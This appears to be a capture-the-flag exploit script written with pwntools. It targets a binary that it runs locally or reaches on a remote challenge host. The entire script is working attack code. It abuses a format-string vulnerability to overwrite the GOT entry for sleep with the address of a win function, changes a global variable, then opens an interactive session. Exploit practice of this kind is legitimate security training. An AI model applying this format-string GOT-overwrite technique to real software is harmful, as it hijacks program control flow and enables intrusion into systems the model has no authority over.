from pwn import *
from pwnlib.fmtstr import *

binary = args.BIN

context.terminal = ['tmux', 'splitw', '-h']
e = context.binary = ELF(binary, checksec=False)
r = ROP(e)

gs = '''

'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 29376)
    else:
        return process(e.path)

p = start()

sleep = e.got['sleep']
win = e.sym['win']
prob = e.sym['problem']

offset = 6
got_overwrite = fmtstr_payload(offset, {sleep: win})
prob_overwrite = fmtstr_payload(offset, {prob: 98})

p.recvuntil(b'>>>')
p.sendline(got_overwrite)
p.recvuntil(b'>>>')
p.sendline(prob_overwrite)
p.recvuntil(b'Congratulations: ')

p.interactive()

